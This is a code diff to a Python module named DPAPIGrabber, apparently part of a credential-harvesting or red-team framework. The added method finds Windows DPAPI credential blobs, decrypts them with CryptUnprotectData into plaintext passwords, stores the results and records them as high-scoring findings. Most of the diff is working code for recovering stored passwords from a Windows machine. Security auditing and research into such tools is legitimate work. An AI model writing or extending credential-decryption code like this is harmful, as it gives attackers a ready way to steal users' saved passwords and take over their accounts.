@@ -78,8 +78,49 @@ class DPAPIGrabber(GrabberModule):
                     snippets=[f["name"] for f in files[:5]],
                 ))
 
+        # Try to decrypt credential blobs using CryptUnprotectData
+        if context.is_windows:
+            self._decrypt_credential_files(result)
+
         result.status = GrabberStatus.COMPLETED
         return result
+
+    def _decrypt_credential_files(self, result: GrabberResult) -> None:
+        """Attempt to decrypt DPAPI credential blobs using CryptUnprotectData."""
+        try:
+            from ._crypto import dpapi_decrypt
+        except ImportError:
+            return
+
+        for cred in list(result.credentials):
+            if not cred.encrypted_value or len(cred.encrypted_value) < 20:
+                continue
+            # DPAPI blobs start with specific header
+            if cred.encrypted_value[:4] != b"\x01\x00\x00\x00":
+                continue
+
+            try:
+                decrypted = dpapi_decrypt(cred.encrypted_value)
+                if decrypted:
+                    # Try to decode as UTF-16LE (Windows credential format)
+                    try:
+                        plaintext = decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")
+                    except Exception:
+                        plaintext = decrypted.decode("utf-8", errors="ignore")
+
+                    if plaintext and len(plaintext) >= 2:
+                        cred.decrypted_value = plaintext
+                        cred.credential_type = "password"
+                        self.logger.debug(f"Decrypted DPAPI blob: {cred.url}")
+
+                        result.findings.append(self.make_finding(
+                            file_path=cred.url or "[DPAPI]",
+                            description=f"DPAPI credential decrypted",
+                            score=200,
+                            matched_value="CryptUnprotectData success",
+                        ))
+            except Exception as e:
+                self.logger.debug(f"DPAPI decrypt failed: {e}")
 
     @staticmethod
     def _enumerate_credential_files(directory: str) -> list[dict]:
